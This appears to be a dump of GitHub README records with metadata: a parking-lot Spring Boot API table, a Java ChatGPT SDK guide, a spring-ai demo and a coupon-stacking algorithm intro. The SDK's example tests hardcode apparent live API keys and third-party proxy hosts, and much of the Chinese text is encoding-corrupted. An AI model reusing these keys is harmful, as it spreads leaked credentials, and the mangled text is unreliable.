  <tr>
    <td>POST</td>
    <td>/parks/userId/{userId}/check-in</td>
    <td>Check in to a park (Driver)</td>
    <td>ParkCheckInRequest request</td>
    <td>Authorization header with Bearer token</td>
    <td>{userId} - Valid UUID</td>
    <td></td>
    <td></td>
  </tr>
  <tr>
    <td>POST</td>
    <td>/parks/userId/{userId}/check-out</td>
    <td>Check out from a park (Driver)</td>
    <td>ParkCheckOutRequest request</td>
    <td>Authorization header with Bearer token</td>
    <td>{userId} - Valid UUID</td>
    <td></td>
    <td></td>
  </tr>
  <tr>
    <td>POST</td>
    <td>/parking-area</td>
    <td>Create a new parking area (Admin)</td>
    <td>ParkingAreaCreateRequest request</td>
    <td>Authorization header with Bearer token</td>
    <td></td>
    <td></td>
    <td></td>
  </tr>
  <tr>
    <td>GET</td>
    <td>/parking-area/id/{parkingAreaId}</td>
    <td>Get a parking area by ID (Admin)</td>
    <td></td>
    <td>Authorization header with Bearer token</td>
    <td>{parkingAreaId} - Valid UUID</td>
    <td></td>
    <td></td>
  </tr>
  <tr>
    <td>GET</td>
    <td>/parking-area/name/{name}</td>
    <td>Get a parking area by name (Admin)</td>
    <td></td>
    <td>Authorization header with Bearer token</td>
    <td>{name} - Non-empty string</td>
    <td></td>
    <td></td>
  </tr>
  <tr>
    <td>GET</td>
    <td>/parking-area/income</td>
    <td>Get daily income for a parking area (Admin)</td>
    <td>date - Date in dd-MM-yyyy format<br>parkingAreaId - String</td>
    <td>Authorization header with Bearer token</td>
    <td></td>
    <td>parkingAreaId - Valid UUID , date - Valid Date</td>
    <td></td>
  </tr>
  <tr>
    <td>DELETE</td>
    <td>/parking-area/{parkingAreaId}</td>
    <td>Delete a parking area by ID (Admin)</td>
    <td></td>
    <td>Authorization header with Bearer token</td>
    <td>{parkingAreaId} - Valid UUID</td>
    <td></td>
    <td></td>
  </tr>
  <tr>
    <td>PUT</td>
    <td>/parking-area/{parkingAreaId}</td>
    <td>Update a parking area by ID (Admin)</td>
    <td>ParkingAreaUpdateRequest request</td>
    <td>Authorization header with Bearer token</td>
    <td>{parkingAreaId} - Valid UUID</td>
    <td></td>
    <td></td>
  </tr>
  <tr>
    <td>GET</td>
    <td>/users/user/{user-id}</td>
    <td>Get user information by ID (Driver)</td>
    <td></td>
    <td>Authorization header with Bearer token</td>
    <td>{user-id} - Valid UUID</td>
    <td></td>
    <td></td>
  </tr>
  <tr>
    <td>GET</td>
    <td>/users/admin/{admin-id}</td>
    <td>Get admin information by ID (Admin)</td>
    <td></td>
    <td>Authorization header with Bearer token</td>
    <td>{admin-id} - Valid UUID</td>
    <td></td>
    <td></td>
  </tr>
  <tr>
    <td>POST</td>
    <td>/vehicles/assign/{user-id}</td>
    <td>Assign a vehicle to a user (Driver)</td>
    <td>VehicleRequest request</td>
    <td>Authorization header with Bearer token</td>
    <td>{user-id} - Valid UUID</td>
    <td></td>
    <td></td>
  </tr>
  <tr>
    <td>GET</td>
    <td>/vehicles/get-parking-detail/{licensePlate}</td>
    <td>Get parking details of a vehicle (Driver)</td>
    <td></td>
    <td>Authorization header with Bearer token</td>
    <td>{licensePlate} - String</td>
    <td></td>
    <td></td>
  </tr>
</table>


---
### Technologies


- Java 17
- Spring Boot 3.0
- Spring Security
- JWT
- Restful API
- Lombok
- Maven
- Junit5
- Mockito
- Integration Tests
- Docker
- Docker Compose
- CI/CD (Github Actions)
- Prometheus and Grafana
- Postman
- Actuator
- Open Api (Swagger 3)
- Liquibase

---
### Postman

```
Import postman collection under postman_collection folder
```

---
### Open Api (Swagger 3)

```
http://localhost:1222/swagger-ui/index.html
```

---
### Prerequisites

#### Define Variable in .env file

```
DATABASE_USERNAME={DATABASE_USERNAME}
DATABASE_PASSWORD={DATABASE_PASSWORD}
PARKING_LOT_LIQUIBASE_ENABLE_DROP_FIRST=true
```

---
- Maven or Docker
---


### Docker Run
The application can be built and run by the `Docker` engine. The `Dockerfile` has multistage build, so you do not need to build and run separately.

Please follow directions shown below in order to build and run the application with Docker Compose file;

```sh
$ cd parkinglot
$ docker-compose up -d
```

If you change anything in the project and run it on Docker, you can also use this command shown below

```sh
$ cd parkinglot
$ docker-compose up --build
```

---
### Maven Run
To build and run the application with `Maven`, please follow the directions shown below;

```sh
$ cd parkinglot
$ mvn clean install
$ mvn spring-boot:run
```

---
### Docker Image Location

```
https://hub.docker.com/repository/docker/noyandocker/parkinglot/general
```

---
### Prometheus 
To open `Prometheus` running on Docker as Image , please go to the link shown below. 
Its screenshot is displayed in the Screenshots part.
```
http://localhost:9090
```

---
### Grafana 
To open `Grafana` running on Docker as Image , please go to the link shown below. 
Its screenshots is displayed in the Screenshots part.
```
http://localhost:3000
```

---
### Screenshots

<details>
<summary>Click here to show the screenshots of project</summary>
    <p> Figure 1 </p>
    <img src =""screenshots/screenshot_1.PNG"">
    <p> Figure 2 </p>
    <img src =""screenshots/screenshot_2.PNG"">
    <p> Figure 3 </p>
    <img src =""screenshots/screenshot_3.PNG"">
    <p> Figure 4 </p>
    <img src =""screenshots/screenshot_4.PNG"">
    <p> Figure 5 </p>
    <img src =""screenshots/screenshot_5.PNG"">
    <p> Figure 6 </p>
    <img src =""screenshots/screenshot_6.PNG"">
    <p> Figure 7 </p>
    <img src =""screenshots/screenshot_7.PNG"">
    <p> Figure 8 </p>
    <img src =""screenshots/screenshot_8.PNG"">
    <p> Figure 9 </p>
    <img src =""screenshots/screenshot_9.PNG"">
    <p> Figure 10 </p>
    <img src =""screenshots/screenshot_10.PNG"">
    <p> Figure 11 </p>
    <img src =""screenshots/screenshot_11.PNG"">
    <p> Figure 12 </p>
    <img src =""screenshots/screenshot_12.PNG"">
    <p> Figure 13 </p>
    <img src =""screenshots/screenshot_13.PNG"">
    <p> Figure 14 </p>
    <img src =""screenshots/screenshot_14.PNG"">
    <p> Figure 15 </p>
    <img src =""screenshots/screenshot_15.PNG"">
    <p> Figure 16 </p>
    <img src =""screenshots/screenshot_16.PNG"">
    <p> Figure 17 </p>
    <img src =""screenshots/screenshot_17.PNG"">
    <p> Figure 18 </p>
    <img src =""screenshots/screenshot_18.PNG"">
    <p> Figure 19 </p>
    <img src =""screenshots/screenshot_19.PNG"">
    <p> Figure 20 </p>
    <img src =""screenshots/prometheus_1.PNG"">
    <p> Figure 21 </p>
    <img src =""screenshots/grafana_1.PNG"">
    <p> Figure 22 </p>
    <img src =""screenshots/grafana_2.PNG"">
    <p> Figure 23 </p>
    <img src =""screenshots/grafana_3.PNG"">
    <p> Figure 24 </p>
    <img src =""screenshots/grafana_4.PNG"">
    <p> Figure 25 </p>
    <img src =""screenshots/grafana_5.PNG"">
    <p> Figure 26 </p>
    <img src =""screenshots/grafana_6.PNG"">
    <p> Figure 27 </p>
    <img src =""screenshots/grafana_7.PNG"">
    <p> Figure 28 </p>
    <img src =""screenshots/grafana_8.PNG"">
    <p> Figure 29 </p>
    <img src =""screenshots/grafana_9.PNG"">
</details>

### Contributors

- [Sercan Noyan GermiyanoÄŸlu](https://github.com/Rapter1990)
- [Muhammet OÄŸuzhan AydoÄŸdu](https://github.com/moaydogdu)
- [Mehmet Åeymus YÃ¼zen](https://github.com/mehmetseymusyuzen)
- [Harun Yusuf EkÅŸioÄŸlu](https://github.com/artfulCoder98)
",0,0,1,20.0,"['case', 'study', 'parking', 'lot', 'information', 'explore', 'rest', 'apis', 'technology', 'postman', 'open', 'api', 'swagger', 'prerequisite', 'define', 'variable', 'file', 'docker', 'run', 'maven', 'run', 'docker', 'image', 'location', 'prometheus', 'grafana', 'screenshots', 'contributor']","['docker', 'run', 'case', 'study', 'parking']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.liquibase:liquibase-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
1321928757/chatgpt-sdk-java,master,"# ChatGPTå¤§æ¨¡å‹å¼€æ”¾SDK - By åˆ˜ä»•æ°

ä¸ºäº†è®©ç ”å‘ä¼™ä¼´æ›´å¿«ï¼Œæ›´æ–¹ä¾¿çš„æ¥å…¥ä½¿ç”¨Openaiçš„å¤§æ¨¡å‹ã€‚ä»è€Œå¼€å‘çš„ chatgpt-sdk-java ä¹Ÿæ¬¢è¿ğŸ‘ğŸ»å¤§å®¶åŸºäºopenaiå¼€æ”¾apiæ¥å£è¡¥å……éœ€è¦çš„åŠŸèƒ½ã€‚

æ­¤SDKè®¾è®¡ï¼Œä»¥ Session ä¼šè¯æ¨¡å‹ï¼Œæä¾›ä¼šè¯å·¥å‚ğŸ­åˆ›å»ºæœåŠ¡ä¼šè¯ã€‚ä»£ç éå¸¸æ¸…æ™°ï¼Œæ˜“äºæ‰©å±•ã€æ˜“äºç»´æŠ¤ã€‚

---

>**ä½œè€…**ï¼šLuckySJ-åˆ˜ä»•æ° - åœ¨çº¿æ¼”ç¤ºåœ°å€ [**www.luckysj.online**](https://www.luckysj.online/)

## ğŸ‘£ç›®å½•

1. ç»„ä»¶é…ç½®
2. åŠŸèƒ½æµ‹è¯•
   1. ä»£ç æ‰§è¡Œ - `ä½¿ç”¨ï¼šä»£ç çš„æ–¹å¼ä¸»è¦ç”¨äºç¨‹åºæ¥å…¥`
3. ç¨‹åºæ¥å…¥

## 1. ç»„ä»¶é…ç½®

- ç”³è¯·ApiKeyï¼šå¯ä»¥å»OpenAIå®˜ç½‘æ³¨å†Œç”³è¯·å¼€é€šï¼Œä¹Ÿå¯åˆ°æŸå®è´­ä¹°key
- è¿è¡Œç¯å¢ƒï¼šJDK 1.8+
- maven pom - `æœªæ¨é€åˆ°Mavenä¸­å¤®ä»“åº“ï¼Œéœ€è¦ä¸‹è½½ä»£ç æœ¬åœ° install åä½¿ç”¨`

## 2. åŠŸèƒ½æµ‹è¯•

### 2.1 ä»£ç æ‰§è¡Œ

```java
@Slf4j
public class ApiTest {

    private OpenAiSession openAiSession;

    @Before
    public void test_OpenAiSessionFactory() {
        // 1. é…ç½®æ–‡ä»¶ [è”ç³»å°å‚…å“¥è·å–key]
        // 1.1 å®˜ç½‘åŸå§‹ apiHost https://api.openai.com/ - å®˜ç½‘çš„Keyå¯ç›´æ¥ä½¿ç”¨
        // 1.2 ä¸‰æ–¹å…¬å¸ apiHost https://pro-share-aws-api.zcyai.com/  ä¸èƒ½ç”¨å°±æ¢å…¶ä»–åœ°å€
        Configuration configuration = new Configuration();
        configuration.setApiHost(""https://pro-share-aws-api.zcyai.com/"");
        configuration.setApiKey(""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"");
        // 2. ä¼šè¯å·¥å‚
        OpenAiSessionFactory factory = new DefaultOpenAiSessionFactory(configuration);
        // 3. å¼€å¯ä¼šè¯
        this.openAiSession = factory.openSession();
    }

    /**
     * ã€å¸¸ç”¨å¯¹è¯æ¨¡å¼ï¼Œæ¨èä½¿ç”¨æ­¤æ¨¡å‹è¿›è¡Œæµ‹è¯•ã€‘
     * æ­¤å¯¹è¯æ¨¡å‹ 3.5/4.0 æ¥è¿‘äºå®˜ç½‘ä½“éªŒ & æµå¼åº”ç­”
     */
    @Test
    public void test_chat_completions_stream_channel() throws JsonProcessingException, InterruptedException {
        // 1. åˆ›å»ºå‚æ•°
        ChatCompletionRequest chatCompletion = ChatCompletionRequest
                .builder()
                .stream(true)
                .messages(Collections.singletonList(Message.builder().role(Constants.Role.USER).content(""1+1"").build()))
                .model(ChatCompletionRequest.Model.GPT_3_5_TURBO.getCode())
                .maxTokens(1024)
                .build();

        // 2. ç”¨æˆ·é…ç½® ã€å¯é€‰å‚æ•°ï¼Œæ”¯æŒä¸åŒæ¸ é“çš„ apiHostã€apiKeyã€‘- æ–¹ä¾¿ç»™æ¯ä¸ªç”¨æˆ·éƒ½åˆ†é…äº†è‡ªå·±çš„keyï¼Œç”¨äºå”®å–åœºæ™¯
        String apiHost = ""https://pro-share-aws-api.zcyai.com/"";
        String apiKey = ""sk-b0A0eSKTNxgBqrHv7aAa0808EdB849C89499D928648bD416"";

        // 3. å‘èµ·è¯·æ±‚
        EventSource eventSource = openAiSession.chatCompletions(apiHost, apiKey, chatCompletion, new EventSourceListener() {
            @Override
            public void onEvent(EventSource eventSource, String id, String type, String data) {
                log.info(""æµ‹è¯•ç»“æœ id:{} type:{} data:{}"", id, type, data);
            }

            @Override
            public void onFailure(EventSource eventSource, Throwable t, Response response) {
                log.error(""å¤±è´¥ code:{} message:{}"", response.code(), response.message());
            }
        });
        // ç­‰å¾…
        new CountDownLatch(1).await();
    }

    /**
     * ã€å¸¸ç”¨å¯¹è¯æ¨¡å¼ï¼Œæ¨èä½¿ç”¨æ­¤æ¨¡å‹è¿›è¡Œæµ‹è¯•ã€‘
     * æ­¤å¯¹è¯æ¨¡å‹ 3.5/4.0 æ¥è¿‘äºå®˜ç½‘ä½“éªŒ & æµå¼åº”ç­”
     */
    @Test
    public void test_chat_completions_stream() throws JsonProcessingException, InterruptedException {
        // 1. åˆ›å»ºå‚æ•°
        ChatCompletionRequest chatCompletion = ChatCompletionRequest
                .builder()
                .stream(true)
                .messages(Collections.singletonList(Message.builder().role(Constants.Role.USER).content(""1+1"").build()))
                .model(ChatCompletionRequest.Model.GPT_3_5_TURBO.getCode())
                .maxTokens(1024)
                .build();

        // 2. å‘èµ·è¯·æ±‚
        EventSource eventSource = openAiSession.chatCompletions(chatCompletion, new EventSourceListener() {
            @Override
            public void onEvent(EventSource eventSource, String id, String type, String data) {
                log.info(""æµ‹è¯•ç»“æœ id:{} type:{} data:{}"", id, type, data);
            }

            @Override
            public void onFailure(EventSource eventSource, Throwable t, Response response) {
                log.error(""å¤±è´¥ code:{} message:{}"", response.code(), response.message());
            }
        });

        // ç­‰å¾…
        new CountDownLatch(1).await();
    }


    /**
     * ç®€å•é—®ç­”æ¨¡å¼
     */
    @Test
    public void test_qa_completions() throws JsonProcessingException {
        QACompletionResponse response01 = openAiSession.completions(""æ‚¨å¥½"");
        log.info(""æµ‹è¯•ç»“æœï¼š{}"", new ObjectMapper().writeValueAsString(response01.getChoices()));
    }

    /**
     * ç®€å•é—®ç­”æ¨¡å¼ * æµå¼åº”ç­”
     */
    @Test
    public void test_qa_completions_stream() throws JsonProcessingException, InterruptedException {
        // 1. åˆ›å»ºå‚æ•°
        QACompletionRequest request = QACompletionRequest
                .builder()
                .prompt(""å†™ä¸ªjavaå†’æ³¡æ’åº"")
                .stream(true)
                .build();

        for (int i = 0; i < 1; i++) {
            // 2. å‘èµ·è¯·æ±‚
            EventSource eventSource = openAiSession.completions(request, new EventSourceListener() {
                @Override
                public void onEvent(EventSource eventSource, String id, String type, String data) {
                    log.info(""æµ‹è¯•ç»“æœï¼š{}"", data);
                }
            });
        }

        // ç­‰å¾…
        new CountDownLatch(1).await();
    }

    /**
     * æ­¤å¯¹è¯æ¨¡å‹ 3.5 æ¥è¿‘äºå®˜ç½‘ä½“éªŒ
     */
    @Test
    public void test_chat_completions() {
        // 1. åˆ›å»ºå‚æ•°
        ChatCompletionRequest chatCompletion = ChatCompletionRequest
                .builder()
                .messages(Collections.singletonList(Message.builder().role(Constants.Role.USER).content(""å†™ä¸€ä¸ªjavaå†’æ³¡æ’åº"").build()))
                .model(ChatCompletionRequest.Model.GPT_3_5_TURBO.getCode())
                .build();
        // 2. å‘èµ·è¯·æ±‚
        ChatCompletionResponse chatCompletionResponse = openAiSession.completions(chatCompletion);
        // 3. è§£æç»“æœ
        chatCompletionResponse.getChoices().forEach(e -> {
            log.info(""æµ‹è¯•ç»“æœï¼š{}"", e.getMessage());
        });
    }

    /**
     * ä¸Šä¸‹æ–‡å¯¹è¯
     */
    @Test
    public void test_chat_completions_context() {
        // 1-1. åˆ›å»ºå‚æ•°
        ChatCompletionRequest chatCompletion = ChatCompletionRequest
                .builder()
                .messages(new ArrayList<>())
                .model(ChatCompletionRequest.Model.GPT_3_5_TURBO.getCode())
                .user(""testUser01"")
                .build();
        // å†™å…¥è¯·æ±‚ä¿¡æ¯
        chatCompletion.getMessages().add(Message.builder().role(Constants.Role.USER).content(""å†™ä¸€ä¸ªjavaå†’æ³¡æ’åº"").build());

        // 1-2. å‘èµ·è¯·æ±‚
        ChatCompletionResponse chatCompletionResponse01 = openAiSession.completions(chatCompletion);
        log.info(""æµ‹è¯•ç»“æœï¼š{}"", chatCompletionResponse01.getChoices());

        // å†™å…¥è¯·æ±‚ä¿¡æ¯
        chatCompletion.getMessages().add(Message.builder().role(Constants.Role.USER).content(chatCompletionResponse01.getChoices().get(0).getMessage().getContent()).build());
        chatCompletion.getMessages().add(Message.builder().role(Constants.Role.USER).content(""æ¢ä¸€ç§å†™æ³•"").build());

        ChatCompletionResponse chatCompletionResponse02 = openAiSession.completions(chatCompletion);
        log.info(""æµ‹è¯•ç»“æœï¼š{}"", chatCompletionResponse02.getChoices());
    }

    /**
     * æ–‡æœ¬ä¿®å¤
     */
    @Test
    public void test_edit() {
        // æ–‡æœ¬è¯·æ±‚
        EditRequest textRequest = EditRequest.builder()
                .input(""ç å†œä¼šé”"")
                .instruction(""å¸®æˆ‘ä¿®æ”¹é”™å­—"")
                .model(EditRequest.Model.TEXT_DAVINCI_EDIT_001.getCode()).build();
        EditResponse textResponse = openAiSession.edit(textRequest);
        log.info(""æµ‹è¯•ç»“æœï¼š{}"", textResponse);

        // ä»£ç è¯·æ±‚
        EditRequest codeRequest = EditRequest.builder()
                // j <= 10 åº”è¯¥ä¿®æ”¹ä¸º i <= 10
                .input(""for (int i = 1; j <= 10; i++) {\n"" +
                        ""    System.out.println(i);\n"" +
                        ""}"")
                .instruction(""è¿™æ®µä»£ç æ‰§è¡Œæ—¶æŠ¥é”™ï¼Œè¯·å¸®æˆ‘ä¿®æ”¹"").model(EditRequest.Model.CODE_DAVINCI_EDIT_001.getCode()).build();
        EditResponse codeResponse = openAiSession.edit(codeRequest);
        log.info(""æµ‹è¯•ç»“æœï¼š{}"", codeResponse);
    }

    /**
     * ç”Ÿæˆå›¾ç‰‡
     */
    @Test
    public void test_genImages() {
        // æ–¹å¼1ï¼Œç®€å•è°ƒç”¨
        ImageResponse imageResponse01 = openAiSession.genImages(""ç”»ä¸€ä¸ª996åŠ ç­çš„ç¨‹åºå‘˜"");
        log.info(""æµ‹è¯•ç»“æœï¼š{}"", imageResponse01);

//        // æ–¹å¼2ï¼Œè°ƒå‚è°ƒç”¨
//        ImageResponse imageResponse02 = openAiSession.genImages(ImageRequest.builder()
//                .prompt(""ç”»ä¸€ä¸ª996åŠ ç­çš„ç¨‹åºå‘˜"")
//                .size(ImageEnum.Size.size_256.getCode())
//                .responseFormat(ImageEnum.ResponseFormat.B64_JSON.getCode()).build());
//        log.info(""æµ‹è¯•ç»“æœï¼š{}"", imageResponse02);
    }

}
```


## 3. ç¨‹åºæ¥å…¥

SpringBoot é…ç½®ç±»

```java
@Configuration
@EnableConfigurationProperties(ChatGPTSDKConfigProperties.class)
public class ChatGPTSDKConfig {
    @Bean(name = ""chatGPTOpenAiSession"")
    @ConditionalOnProperty(value = ""chatgpt.sdk.config.enabled"", havingValue = ""true"", matchIfMissing = false)
    public OpenAiSession openAiSession(ChatGPTSDKConfigProperties properties) {
        // 1. é…ç½®æ–‡ä»¶
        configuration = new Configuration();
        configuration.setApiHost(properties.getApiHost());
        configuration.setAuthToken(properties.getAuthToken());
        configuration.setApiKey(properties.getApiKey());

        // 2. ä¼šè¯å·¥å‚
        OpenAiSessionFactory factory = new DefaultOpenAiSessionFactory(configuration);

        // 3. å¼€å¯ä¼šè¯
        return factory.openSession();
    }
}

@Data
@ConfigurationProperties(prefix = ""chatgpt.sdk.config"", ignoreInvalidFields = true)
public class ChatGPTSDKConfigProperties {
    /** openai ä»£ç†åœ°å€ */
    private String apiHost;
    /** apikeyï¼Œ*/
    private String apiKey;
    /** éªŒè¯tokneï¼ˆè¿™é‡Œæš‚æ—¶ç”¨ä¸åˆ°ï¼Œopenaiä¸éœ€è¦ï¼Œå¦‚æœéœ€è¦ä¸­è½¬æœåŠ¡è¿›è¡Œä¼šè¯å‰è®¤è¯å¯ä»¥ä½¿ç”¨è¯¥å­—æ®µï¼‰ */
    private String authToken;
}

```

```java
@Autowired(required = false)
private OpenAiSession openAiSession;
```

- æ³¨æ„ï¼šå¦‚æœä½ åœ¨æœåŠ¡ä¸­é…ç½®äº†å…³é—­å¯åŠ¨ ChatGPT SDK é‚£ä¹ˆæ³¨å…¥ openAiSession ä¸º null

yml é…ç½®

```pom
# ChatGLM SDK Config
chatgpt:
  sdk:
    config:
      # çŠ¶æ€ï¼›true = å¼€å¯ã€false å…³é—­
      enabled: true
      # å®˜ç½‘åœ°å€ https://api.openai.com/,å›½å†…ä»£ç†åœ°å€ https://api.openai-proxy.com/
#      api-host: https://api.openai.com/
      api-host: https://api.openai-proxy.com/
      # å®˜ç½‘ç”³è¯· https://platform.openai.com/account/api-keys
      api-key: sk-cRdJvyq123123
      # è®¤è¯tokenï¼Œè¿™ä¸ªé…ç½®æš‚æ—¶æ²¡ç”¨åˆ°ï¼Œå‡å¦‚è‡ªå·±æ­å»ºäº†gptçš„ä»£ç†è½¬å‘åœ°å€ï¼Œè€Œä¸æƒ³è®©è¿™ä»£ç†ç½‘ç«™å…¬å¼€ä½¿ç”¨ï¼Œå°±å¯ä»¥åŠ ä¸€å±‚tokenæ ¡éªŒï¼Œé™åˆ¶ä½¿ç”¨
      auth-token: 123123


",1,0,1,0.0,"['by', 'chatglm', 'sdk', 'config', 'http', 'http', 'http', 'http']","['http', 'by', 'chatglm', 'sdk', 'config']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-surefire-plugin]",0.0,1.0,0.0
qq418745/spring-ai-example,master,"# spring-ai-example

![ç¤ºä¾‹GIF](./example.gif)
### å‰ææ¡ä»¶

[application.yaml](src%2Fmain%2Fresources%2Fapplication.yaml) ä¸­é…ç½®ä½ çš„ API Key å¯åŠ¨å³å¯ ~

### START

è®¿é—®è¿™é‡Œå¼€å§‹æµ‹è¯•æ•ˆæœï¼

> http://localhost:8080/index.html

### åœ¨çº¿ç©å¼„æœåŠ¡~
>  https://ai.coala.top/index.html



### PS

å¦‚æœå› ä¸å¯æŠ—åŠ›é¡»ä½¿ç”¨ä»£ç†ç«™ï¼Œ [application.yaml](src%2Fmain%2Fresources%2Fapplication.yaml) ä¸­è®°å¾—é…ç½® base-url

",0,0,1,0.0,"['start', 'p']","['start', 'p']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
GaoSSR/OnePRO,main,"<div align=center>
  <img width=""365"" src=""./READMEIMG/Project-Name.png"" />
</div>


<div align=""center"">
  <a href=""javascript:;""><img src=""https://img.shields.io/appveyor/build/gruntjs/grunt?label=%E6%9E%84%E5%BB%BA"" /></a>
  <a href=""javascript:;""><img src=""https://img.shields.io/appveyor/build/gruntjs/grunt?label=%E6%B5%8B%E8%AF%95"" /></a>
  <a href=""javascript:;""><img src=""https://img.shields.io/appveyor/build/gruntjs/grunt?label=%E6%96%87%E6%A1%A3"" /></a>
  <a href=""javascript:;""><img src=""https://img.shields.io/badge/%E5%BC%80%E6%BA%90%E5%8D%8F%E8%AE%AE-Apache-brightgreen"" alt=""License""></a>
 </div>
<br />

## è½»é‡çº§ç®—æ³•é©±åŠ¨ä¼˜æƒ å åŠ å™¨

#### RTï¼š
 <img width=""1000"" src=""./READMEIMG/211690962797_.pic.jpg"" />


#### èƒŒæ™¯ï¼š

ä¼˜æƒ æ˜¯æ¨åŠ¨æ¶ˆè´¹è€…è½¬åŒ–çš„å…³é”®å› ç´ ï¼Œå®ƒåœ¨æ¿€å‘ç”¨æˆ·æ¶ˆè´¹è¡Œä¸ºä¸Šèµ·ç€æ ¸å¿ƒä½œç”¨ã€‚ç›®å‰å¸‚åœºä¸Šçš„ä¼˜æƒ ç­–ç•¥ä¸»è¦æ¶µç›–äº†å„ç§æ´»åŠ¨ï¼ˆä¾‹å¦‚æ‹¼å¤šå¤šçš„â€œç ä¸€åˆ€â€ï¼Œå¤©çŒ«å†œåœºçš„äº’åŠ¨ï¼Œæ–°ç”¨æˆ·çš„é¦–æ¬¡è´­ä¹°ï¼Œå¤è´­ï¼Œç§¯åˆ†ç­‰ï¼‰å’Œä¼˜æƒ åˆ¸ï¼ˆå¦‚æŠ˜æ‰£åˆ¸ï¼Œä»£é‡‘åˆ¸ï¼Œå•†å“åˆ¸ï¼Œä¹°ä¸€èµ ä¸€ç­‰ï¼‰ã€‚ç„¶è€Œï¼Œè¿™äº›å¤æ‚çš„ä¼˜æƒ è§„åˆ™ä½¿å¾—ç”¨æˆ·åœ¨è®¡ç®—ä¼˜æƒ å åŠ çš„é¡ºåºæ—¶æ„Ÿåˆ°å›°æ‰°ã€‚è¿™å¯èƒ½å¯¼è‡´ç”¨æˆ·åœ¨é¢å¯¹å¤šé‡ä¼˜æƒ æ—¶é™ä½è´­ä¹°å•†å“çš„æ¬²æœ›ï¼Œå°¤å…¶æ˜¯å½“ä»–ä»¬å‚ä¸äº†å¤šä¸ªæ´»åŠ¨å¹¶æŒæœ‰å¤šä¸ªä¼˜æƒ åˆ¸æ—¶ï¼Œè¿™ç§æƒ…å†µæ›´ä¸ºæ˜æ˜¾ã€‚

ä¼˜æƒ çš„è®¡ç®—é¡ºåºå¯ä»¥åˆ†ä¸ºå¹³è¡Œå¼å’Œæ¸è¿›å¼ï¼Œå…¶ä¸­å¹³è¡Œå¼ä¼˜æƒ ä¹‹é—´æ²¡æœ‰ç›¸äº’ä¾èµ–å…³ç³»ï¼Œè€Œæ¸è¿›å¼ä¼˜æƒ ä¹‹é—´åˆ™å­˜åœ¨ä¾èµ–å…³ç³»ï¼Œå³ä¸‹ä¸€ä¸ªä¼˜æƒ çš„è§¦å‘å–å†³äºä¸Šä¸€ä¸ªä¼˜æƒ çš„å®æ–½ç»“æœã€‚

è®¾æƒ³å°æ™´æ¶ˆè´¹äº†100å…ƒï¼Œå¥¹æ‰‹å¤´æœ‰ä¸€å¼ 7æŠ˜ä¼˜æƒ åˆ¸å’Œä¸€å¼ æ»¡100å…ƒå‡30å…ƒçš„ä¼˜æƒ åˆ¸ã€‚è¿™ä¸¤ä¸ªä¼˜æƒ åˆ¸çš„ä½¿ç”¨é¡ºåºå¯èƒ½ä¼šäº§ç”Ÿä¸åŒçš„æ•ˆæœï¼Œåˆ™è¿™2ä¸ªä¼˜æƒ åˆ¸çš„ä½¿ç”¨é¡ºåºæœ‰ä»¥ä¸‹ä¸¤ç§æƒ…å†µï¼š

<img src=""./READMEIMG/imageï¼ˆ1ï¼‰.png"" width=""75%"">

`OnePRO`é‡‡ç”¨äº†ä¸€ç³»åˆ—æ–°é¢–çš„ç®—æ³•ï¼Œå®ç°äº†é«˜æ•ˆæ±‚è§£ä¼˜æƒ æ’åˆ—çš„æœ€ä¼˜è§£ã€‚

<img src=""./READMEIMG/imageï¼ˆ2ï¼‰.png"" width=""100%"">

#### æ ¸å¿ƒè®¡ç®—ç±» Permutation&lt;T extends GoodsItem&gt;

`Permutation`æ˜¯ä¸€ä¸ªé‡è¦çš„æŠ½è±¡ç±»ï¼Œä½œä¸º`OnePRO`çš„æ ¸å¿ƒï¼Œå®ƒé‡‡ç”¨äº†å¤šç§ä¼˜åŒ–ç­–ç•¥æ¥ç¡®ä¿é«˜æ€§èƒ½ï¼Œè¿™äº›ç­–ç•¥çš„è¿ç”¨æ—¨åœ¨æå‡è®¡ç®—æ•ˆç‡å’Œé™ä½èµ„æºæ¶ˆè€—ï¼Œè¿™äº›ç­–ç•¥åŒ…æ‹¬ï¼š

- é¢„å­˜çš„æ’åˆ—æ•°ç»“æœé›†

ä¹‹æ‰€ä»¥é‡‡ç”¨è¿™ç§è®¾è®¡ï¼Œæ˜¯å› ä¸ºåœ¨ä¸šåŠ¡åœºæ™¯ä¸­ï¼Œæˆ‘ä»¬éœ€è¦é¢‘ç¹è¿›è¡Œæ’åˆ—è®¡ç®—ã€‚å¯¹äºç»™å®šé•¿åº¦çš„åºåˆ—ï¼Œå…¶æ’åˆ—ç»“æœæ˜¯å›ºå®šçš„ã€‚åœ¨`Permutation`ç±»ä¸­ï¼Œ`PERMUTATIONS`å±æ€§å­˜å‚¨äº†7ä»¥å†…çš„æ’åˆ—æ•°ç»“æœé›†ã€‚ç”±äºè¿™é‡Œä½¿ç”¨äº†`Byte`æ¥å­˜å‚¨æ•°æ®ï¼Œå› æ­¤å ç”¨çš„å†…å­˜ç©ºé—´éå¸¸å°ï¼Œè¿™æœ‰åŠ©äºæé«˜æ€§èƒ½å¹¶é™ä½å†…å­˜æ¶ˆè€—ã€‚

```Java
private final static Map<Integer,Collection<List<Byte>>> PERMUTATIONS = Maps.newHashMap();

```
è¿™ä¸ªåŠ¨ä½œåœ¨ç±»åŠ è½½å®Œæˆæ—¶æ‰§è¡Œï¼Œå¦‚æœè§‰å¾—7ä¸åˆé€‚ï¼Œå¯¹7ä¸æ»¡æ„ï¼Œå¯ä»¥é€šè¿‡è°ƒæ•´`SUPPORTEDSIZE`çš„å¤§å°æ¥æ»¡è¶³ä¸šåŠ¡å’Œæ€§èƒ½çš„éœ€æ±‚ã€‚

æˆ‘ä»¬åœ¨å®ç°ä¸­ç»è¿‡æµ‹è¯•å’Œè°ƒæ•´ï¼Œç¡®å®šäº†7æ˜¯ä¸€ä¸ªç›¸å¯¹å¹³è¡¡çš„å‚æ•°ï¼Œå®ƒå…¼é¡¾äº†ä¸šåŠ¡ä¸æ€§èƒ½ï¼Œå½“ç„¶ï¼Œæ ¹æ®å®é™…éœ€æ±‚ï¼Œå¤§å®¶å¯ä»¥æ ¹æ®è‡ªå·±çš„æƒ…å†µæ¥è°ƒæ•´è¿™ä¸ªå‚æ•°ã€‚

```Java
public final static int SUPPORTEDSIZE = 7;

static{
